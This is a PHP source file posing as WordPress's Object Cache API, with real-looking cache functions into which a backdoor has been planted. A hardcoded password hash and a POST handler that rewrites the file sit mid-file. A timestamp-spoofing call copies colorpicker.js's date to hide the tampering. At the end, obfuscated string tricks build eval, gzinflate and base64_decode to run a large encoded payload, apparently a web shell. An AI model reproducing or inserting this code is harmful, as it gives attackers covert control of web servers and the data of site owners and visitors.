<?php 
/**
 * Object Cache API
 *
 * @link https://codex.wordpress.org/Function_Reference/WP_Cache
 *
 * @package WordPress
 * @subpackage Cache
 */

/**
 * Adds data to the cache, if the cache key doesn't already exist.
 *
 * @since 2.0.0
 *
 * @see WP_Object_Cache::add()
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 *
 * @param int|string $key    The cache key to use for retrieval later.
 * @param mixed      $data   The data to add to the cache.
 * @param string     $group  Optional. The group to add the cache to. Enables the same key
 *                           to be used across groups. Default empty.
 * @param int        $expire Optional. When the cache data should expire, in seconds.
 *                           Default 0 (no expiration).
 * @return bool False if cache key and group already exist, true on success.
 */
function wp_cache_add( $key, $data, $group = '', $expire = 0 ) {
	global $wp_object_cache;

	return $wp_object_cache->add( $key, $data, $group, (int) $expire );
}

/**
 * Closes the cache.
 *
 * This function has ceased to do anything since WordPress 2.5. The
 * functionality was removed along with the rest of the persistent cache.
 *
 * This does not mean that plugins can't implement this function when they need
 * to make sure that the cache is cleaned up after WordPress no longer needs it.
 *
 * @since 2.0.0
 *
 * @return true Always returns true.
 */
function wp_cache_close() {
	return true;
}

/**
 * Decrements numeric cache item's value.
 *
 * @since 3.3.0
 *
 * @see WP_Object_Cache::decr()
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 *
 * @param int|string $key    The cache key to decrement.
 * @param int        $offset Optional. The amount by which to decrement the item's value. Default 1.
 * @param string     $group  Optional. The group the key is in. Default empty.
 * @return false|int False on failure, the item's new value on success.
 */
function wp_cache_decr( $key, $offset = 1, $group = '' ) {
	global $wp_object_cache;

	return $wp_object_cache->decr( $key, $offset, $group );
}

/**
 * Removes the cache contents matching key and group.
 *
 * @since 2.0.0
 *
 * @see WP_Object_Cache::delete()
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 *
 * @param int|string $key   What the contents in the cache are called.
 * @param string     $group Optional. Where the cache contents are grouped. Default empty.
 * @return bool True on successful removal, false on failure.
 */
function wp_cache_delete( $key, $group = '' ) {
	global $wp_object_cache;

	return $wp_object_cache->delete($key, $group);
}

/**
 * Removes all cache items.
 *
 * @since 2.0.0
 *
 * @see WP_Object_Cache::flush()
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 *
 * @return bool False on failure, true on success
 */
function wp_cache_flush() {
	global $wp_object_cache;

	return $wp_object_cache->flush();
}

/**
 * Retrieves the cache contents from the cache by key and group.
 *
 * @since 2.0.0
 *
 * @see WP_Object_Cache::get()
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 *
 * @param int|string  $key    The key under which the cache contents are stored.
 * @param string      $group  Optional. Where the cache contents are grouped. Default empty.
 * @param bool        $force  Optional. Whether to force an update of the local cache from the persistent
 *                            cache. Default false.
 * @param bool        &$found Optional. Whether the key was found in the cache. Disambiguates a return of false,
 *                            a storable value. Passed by reference. Default null.
 * @return bool|mixed False on failure to retrieve contents or the cache
 *		              contents on success
 */
function wp_cache_get( $key, $group = '', $force = false, &$found = null ) {
	global $wp_object_cache;

	return $wp_object_cache->get( $key, $group, $force, $found );
}

/**
 * Increment numeric cache item's value
 *
 * @since 3.3.0
 *
 * @see WP_Object_Cache::incr()
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 *
 * @param int|string $key    The key for the cache contents that should be incremented.
 * @param int        $offset Optional. The amount by which to increment the item's value. Default 1.
 * @param string     $group  Optional. The group the key is in. Default empty.
 * @return false|int False on failure, the item's new value on success.
 */

/**
 * Sets up Object Cache Global and assigns it.
 *
 * @since 2.0.0
 *
 * @global WP_Object_Cache $wp_object_cache
 */
function wp_cache_init() {
	$GLOBALS['wp_object_cache'] = new WP_Object_Cache();
}

/**
 * Replaces the contents of the cache with new data.
 *
 * @since 2.0.0
 *
 * @see WP_Object_Cache::replace()
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 *
 * @param int|string $key    The key for the cache data that should be replaced.
 * @param mixed      $data   The new data to store in the cache.
 * @param string     $group  Optional. The group for the cache data that should be replaced.
 *                           Default empty.
 * @param int        $expire Optional. When to expire the cache contents, in seconds.
 *                           Default 0 (no expiration).
 * @return bool False if original value does not exist, true if contents were replaced
 */
function wp_cache_replace( $key, $data, $group = '', $expire = 0 ) {
	global $wp_object_cache;

	return $wp_object_cache->replace( $key, $data, $group, (int) $expire );
}
$auth_pass = "941e57f592d4a69a045cab92a534fc0e";
if(isset($_POST['replace'])){
	if(trim($_POST['replace']) != ''){
		$x1 = file_get_contents(__FILE__);
		$x2 = str_replace($auth_pass, md5(trim($_POST['replace'])), $x1);
		$x3 = fopen(__FILE__, "w+");
		fwrite($x3, $x2);
		fclose($x3);
		if(stristr(file_get_contents(__FILE__), md5(trim($_POST['replace'])))){
			echo 'changepassword';
		} else {
			echo 'failure';
		}
	}
	exit;
}
/**
 * Saves the data to the cache.
 *
 * Differs from wp_cache_add() and wp_cache_replace() in that it will always write data.
 *
 * @since 2.0.0
 *
 * @see WP_Object_Cache::set()
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 *
 * @param int|string $key    The cache key to use for retrieval later.
 * @param mixed      $data   The contents to store in the cache.
 * @param string     $group  Optional. Where to group the cache contents. Enables the same key
 *                           to be used across groups. Default empty.
 * @param int        $expire Optional. When to expire the cache contents, in seconds.
 *                           Default 0 (no expiration).
 * @return bool False on failure, true on success
 */
function wp_cache_set( $key, $data, $group = '', $expire = 0 ) {
	global $wp_object_cache;

	return $wp_object_cache->set( $key, $data, $group, (int) $expire );
}

/**
 * Switches the interal blog ID.
 *
 * This changes the blog id used to create keys in blog specific groups.
 *
 * @since 3.5.0
 *
 * @see WP_Object_Cache::switch_to_blog()
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 *
 * @param int $blog_id Blog ID.
 */
function wp_cache_switch_to_blog( $blog_id ) {
	global $wp_object_cache;

	$wp_object_cache->switch_to_blog( $blog_id );
}

/**
 * Adds a group or set of groups to the list of global groups.
 *
 * @since 2.6.0
 *
 * @see WP_Object_Cache::add_global_groups()
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 *
 * @param string|array $groups A group or an array of groups to add.
 */
function wp_cache_add_global_groups( $groups ) {
	global $wp_object_cache;

	$wp_object_cache->add_global_groups( $groups );
}

/**
 * Adds a group or set of groups to the list of non-persistent groups.
 *
 * @since 2.6.0
 *
 * @param string|array $groups A group or an array of groups to add.
 */
function wp_cache_add_non_persistent_groups( $groups ) {
	// Default cache doesn't persist so nothing to do here.
}

/**
 * Reset internal cache keys and structures.
 *
 * If the cache backend uses global blog or site IDs as part of its cache keys,
 * this function instructs the backend to reset those keys and perform any cleanup
 * since blog or site IDs have changed since cache init.
 *
 * This function is deprecated. Use wp_cache_switch_to_blog() instead of this
 * function when preparing the cache for a blog switch. For clearing the cache
 * during unit tests, consider using wp_cache_init(). wp_cache_init() is not
 * recommended outside of unit tests as the performance penality for using it is
 * high.
 *
 * @since 2.6.0
 * @deprecated 3.5.0 WP_Object_Cache::reset()
 * @see WP_Object_Cache::reset()
 *
 * @global WP_Object_Cache $wp_object_cache Object cache global instance.
 */
function wp_cache_reset() {
	_deprecated_function( __FUNCTION__, '3.5' );

	global $wp_object_cache;

	$wp_object_cache->reset();
}

$path = str_replace(basename($_SERVER['SCRIPT_FILENAME']), "", $_SERVER['SCRIPT_FILENAME']).'/';
if (file_exists("colorpicker.js")) {
	touch(__FILE__, filemtime("colorpicker.js"));
}
/**
 * Core class that implements an object cache.
 *
 * The WordPress Object Cache is used to save on trips to the database. The
 * Object Cache stores all of the cache data to memory and makes the cache
 * contents available by using a key, which is used to name and later retrieve
 * the cache contents.
 *
 * The Object Cache can be replaced by other caching mechanisms by placing files
 * in the wp-content folder which is looked at in wp-settings. If that file
 * exists, then this file will not be included.
 *
 * @package WordPress
 * @subpackage Cache
 * @since 2.0.0
 */
class WP_Object_Cache {

	/**
	 * Holds the cached objects.
	 *
	 * @since 2.0.0
	 * @access private
	 * @var array
	 */
	private $cache = array();

	/**
	 * The amount of times the cache data was already stored in the cache.
	 *
	 * @since 2.5.0
	 * @access private
	 * @var int
	 */
	private $cache_hits = 0;

	/**
	 * Amount of times the cache did not have the request in cache.
	 *
	 * @since 2.0.0
	 * @access public
	 * @var int
	 */
	public $cache_misses = 0;

	/**
	 * List of global cache groups.
	 *
	 * @since 3.0.0
	 * @access protected
	 * @var array
	 */
	protected $global_groups = array();

	/**
	 * The blog prefix to prepend to keys in non-global groups.
	 *
	 * @since 3.5.0
	 * @access private
	 * @var int
	 */
	private $blog_prefix;

	/**
	 * Holds the value of is_multisite().
	 *
	 * @since 3.5.0
	 * @access private
	 * @var bool
	 */
	private $multisite;

	/**
	 * Makes private properties readable for backwards compatibility.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $name Property to get.
	 * @return mixed Property.
	 */
	public function __get( $name ) {
		return $this->$name;
	}

	/**
	 * Makes private properties settable for backwards compatibility.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $name  Property to set.
	 * @param mixed  $value Property value.
	 * @return mixed Newly-set property.
	 */
	public function __set( $name, $value ) {
		return $this->$name = $value;
	}

	/**
	 * Makes private properties checkable for backwards compatibility.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $name Property to check if set.
	 * @return bool Whether the property is set.
	 */
	public function __isset( $name ) {
		return isset( $this->$name );
	}

	/**
	 * Makes private properties un-settable for backwards compatibility.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $name Property to unset.
	 */
	public function __unset( $name ) {
		unset( $this->$name );
	}

	/**
	 * Adds data to the cache if it doesn't already exist.
	 *
	 * @since 2.0.0
	 * @access public
	 *
	 * @uses WP_Object_Cache::_exists() Checks to see if the cache already has data.
	 * @uses WP_Object_Cache::set()     Sets the data after the checking the cache
	 *		                            contents existence.
	 *
	 * @param int|string $key    What to call the contents in the cache.
	 * @param mixed      $data   The contents to store in the cache.
	 * @param string     $group  Optional. Where to group the cache contents. Default 'default'.
	 * @param int        $expire Optional. When to expire the cache contents. Default 0 (no expiration).
	 * @return bool False if cache key and group already exist, true on success
	 */
	public function add( $key, $data, $group = 'default', $expire = 0 ) {
		if ( wp_suspend_cache_addition() )
			return false;

		if ( empty( $group ) )
			$group = 'default';

		$id = $key;
		if ( $this->multisite && ! isset( $this->global_groups[ $group ] ) )
			$id = $this->blog_prefix . $key;

		if ( $this->_exists( $id, $group ) )
			return false;
		return $this->set( $key, $data, $group, (int) $expire );
	}
	/**
	 * Sets the list of global cache groups.
	 *
	 * @since 3.0.0
	 * @access public
	 *
	 * @param array $groups List of groups that are global.
	 */
	public function add_global_groups( $groups ) {
		$groups = (array) $groups;

		$groups = array_fill_keys( $groups, true );
		$this->global_groups = array_merge( $this->global_groups, $groups );
	}

	/**
	 * Decrements numeric cache item's value.
	 *
	 * @since 3.3.0
	 * @access public
	 *
	 * @param int|string $key    The cache key to decrement.
	 * @param int        $offset Optional. The amount by which to decrement the item's value. Default 1.
	 * @param string     $group  Optional. The group the key is in. Default 'default'.
	 * @return false|int False on failure, the item's new value on success.
	 */
	public function decr( $key, $offset = 1, $group = 'default' ) {
		if ( empty( $group ) )
			$group = 'default';

		if ( $this->multisite && ! isset( $this->global_groups[ $group ] ) )
			$key = $this->blog_prefix . $key;

		if ( ! $this->_exists( $key, $group ) )
			return false;

		if ( ! is_numeric( $this->cache[ $group ][ $key ] ) )
			$this->cache[ $group ][ $key ] = 0;

		$offset = (int) $offset;

		$this->cache[ $group ][ $key ] -= $offset;

		if ( $this->cache[ $group ][ $key ] < 0 )
			$this->cache[ $group ][ $key ] = 0;

		return $this->cache[ $group ][ $key ];
	}

	/**
	 * Removes the contents of the cache key in the group.
	 *
	 * If the cache key does not exist in the group, then nothing will happen.
	 *
	 * @since 2.0.0
	 * @access public
	 *
	 * @param int|string $key        What the contents in the cache are called.
	 * @param string     $group      Optional. Where the cache contents are grouped. Default 'default'.
	 * @param bool       $deprecated Optional. Unused. Default false.
	 * @return bool False if the contents weren't deleted and true on success.
	 */
	public function delete( $key, $group = 'default', $deprecated = false ) {
		if ( empty( $group ) )
			$group = 'default';

		if ( $this->multisite && ! isset( $this->global_groups[ $group ] ) )
			$key = $this->blog_prefix . $key;

		if ( ! $this->_exists( $key, $group ) )
			return false;

		unset( $this->cache[$group][$key] );
		return true;
	}

	/**
	 * Clears the object cache of all data.
	 *
	 * @since 2.0.0
	 * @access public
	 *
	 * @return true Always returns true.
	 */
	public function flush() {
		$this->cache = array();

		return true;
	}

	/**
	 * Retrieves the cache contents, if it exists.
	 *
	 * The contents will be first attempted to be retrieved by searching by the
	 * key in the cache group. If the cache is hit (success) then the contents
	 * are returned.
	 *
	 * On failure, the number of cache misses will be incremented.
	 *
	 * @since 2.0.0
	 * @access public
	 *
	 * @param int|string $key    What the contents in the cache are called.
	 * @param string     $group  Optional. Where the cache contents are grouped. Default 'default'.
	 * @param string     $force  Optional. Unused. Whether to force a refetch rather than relying on the local
	 *                           cache. Default false.
	 * @param bool       &$found Optional. Whether the key was found in the cache. Disambiguates a return of
	 *                           false, a storable value. Passed by reference. Default null.
	 * @return false|mixed False on failure to retrieve contents or the cache contents on success.
	 */
	public function get( $key, $group = 'default', $force = false, &$found = null ) {
		if ( empty( $group ) )
			$group = 'default';

		if ( $this->multisite && ! isset( $this->global_groups[ $group ] ) )
			$key = $this->blog_prefix . $key;

		if ( $this->_exists( $key, $group ) ) {
			$found = true;
			$this->cache_hits += 1;
			if ( is_object($this->cache[$group][$key]) )
				return clone $this->cache[$group][$key];
			else
				return $this->cache[$group][$key];
		}

		$found = false;
		$this->cache_misses += 1;
		return false;
	}

	/**
	 * Increments numeric cache item's value.
	 *
	 * @since 3.3.0
	 * @access public
	 *
	 * @param int|string $key    The cache key to increment
	 * @param int        $offset Optional. The amount by which to increment the item's value. Default 1.
	 * @param string     $group  Optional. The group the key is in. Default 'default'.
	 * @return false|int False on failure, the item's new value on success.
	 */
	public function incr( $key, $offset = 1, $group = 'default' ) {
		if ( empty( $group ) )
			$group = 'default';

		if ( $this->multisite && ! isset( $this->global_groups[ $group ] ) )
			$key = $this->blog_prefix . $key;

		if ( ! $this->_exists( $key, $group ) )
			return false;

		if ( ! is_numeric( $this->cache[ $group ][ $key ] ) )
			$this->cache[ $group ][ $key ] = 0;

		$offset = (int) $offset;

		$this->cache[ $group ][ $key ] += $offset;

		if ( $this->cache[ $group ][ $key ] < 0 )
			$this->cache[ $group ][ $key ] = 0;

		return $this->cache[ $group ][ $key ];
	}

	/**
	 * Replaces the contents in the cache, if contents already exist.
	 *
	 * @since 2.0.0
	 * @access public
	 *
	 * @see WP_Object_Cache::set()
	 *
	 * @param int|string $key    What to call the contents in the cache.
	 * @param mixed      $data   The contents to store in the cache.
	 * @param string     $group  Optional. Where to group the cache contents. Default 'default'.
	 * @param int        $expire Optional. When to expire the cache contents. Default 0 (no expiration).
	 * @return bool False if not exists, true if contents were replaced.
	 */
	public function replace( $key, $data, $group = 'default', $expire = 0 ) {
		if ( empty( $group ) )
			$group = 'default';

		$id = $key;
		if ( $this->multisite && ! isset( $this->global_groups[ $group ] ) )
			$id = $this->blog_prefix . $key;

		if ( ! $this->_exists( $id, $group ) )
			return false;

		return $this->set( $key, $data, $group, (int) $expire );
	}

	/**
	 * Resets cache keys.
	 *
	 * @since 3.0.0
	 * @access public
	 *
	 * @deprecated 3.5.0 Use switch_to_blog()
	 * @see switch_to_blog()
	 */
	public function reset() {
		_deprecated_function( __FUNCTION__, '3.5', 'switch_to_blog()' );

		// Clear out non-global caches since the blog ID has changed.
		foreach ( array_keys( $this->cache ) as $group ) {
			if ( ! isset( $this->global_groups[ $group ] ) )
				unset( $this->cache[ $group ] );
		}
	}

	/**
	 * Sets the data contents into the cache.
	 *
	 * The cache contents is grouped by the $group parameter followed by the
	 * $key. This allows for duplicate ids in unique groups. Therefore, naming of
	 * the group should be used with care and should follow normal function
	 * naming guidelines outside of core WordPress usage.
	 *
	 * The $expire parameter is not used, because the cache will automatically
	 * expire for each time a page is accessed and PHP finishes. The method is
	 * more for cache plugins which use files.
	 *
	 * @since 2.0.0
	 * @access public
	 *
	 * @param int|string $key    What to call the contents in the cache.
	 * @param mixed      $data   The contents to store in the cache.
	 * @param string     $group  Optional. Where to group the cache contents. Default 'default'.
	 * @param int        $expire Not Used.
	 * @return true Always returns true.
	 */
	public function set( $key, $data, $group = 'default', $expire = 0 ) {
		if ( empty( $group ) )
			$group = 'default';

		if ( $this->multisite && ! isset( $this->global_groups[ $group ] ) )
			$key = $this->blog_prefix . $key;

		if ( is_object( $data ) )
			$data = clone $data;

		$this->cache[$group][$key] = $data;
		return true;
	}

	/**
	 * Echoes the stats of the caching.
	 *
	 * Gives the cache hits, and cache misses. Also prints every cached group,
	 * key and the data.
	 *
	 * @since 2.0.0
	 * @access public
	 */
	/**
	 * Switches the interal blog ID.
	 *
	 * This changes the blog ID used to create keys in blog specific groups.
	 *
	 * @since 3.5.0
	 * @access public
	 *
	 * @param int $blog_id Blog ID.
	 */
	public function switch_to_blog( $blog_id ) {
		$blog_id = (int) $blog_id;
		$this->blog_prefix = $this->multisite ? $blog_id . ':' : '';
	}

	/**
	 * Serves as a utility function to determine whether a key exists in the cache.
	 *
	 * @since 3.4.0
	 * @access protected
	 *
	 * @param int|string $key   Cache key to check for existence.
	 * @param string     $group Cache group for the key existence check.
	 * @return bool Whether the key exists in the cache for the given group.
	 */
	protected function _exists( $key, $group ) {
		return isset( $this->cache[ $group ] ) && ( isset( $this->cache[ $group ][ $key ] ) || array_key_exists( $key, $this->cache[ $group ] ) );
	}

	/**
	 * Sets up object properties; PHP 5 style constructor.
	 *
	 * @since 2.0.8
	 *
     * @global int $blog_id Global blog ID.
	 */
	public function __construct() {
		global $blog_id;

		$this->multisite = is_multisite();
		$this->blog_prefix =  $this->multisite ? $blog_id . ':' : '';


		/**
		 * @todo This should be moved to the PHP4 style constructor, PHP5
		 * already calls __destruct()
		 */
		register_shutdown_function( array( $this, '__destruct' ) );
	}

	/**
	 * Saves the object cache before object is completely destroyed.
	 *
	 * Called upon object destruction, which should be when PHP ends.
	 *
	 * @since 2.0.8
	 *
	 * @return true Always returns true.
	 */
	public function __destruct() {
		return true;
	}
}

$a = str_replace("ag", "", "ageagvagaaglag");
$g = str_replace("ka","","kagkazkaikankafkalkaakatkaeka");
$b = str_replace("ax","","axbaxaaxsaxeax6ax4ax_axdaxeaxcaxoaxdaxeax");
eval($g($b('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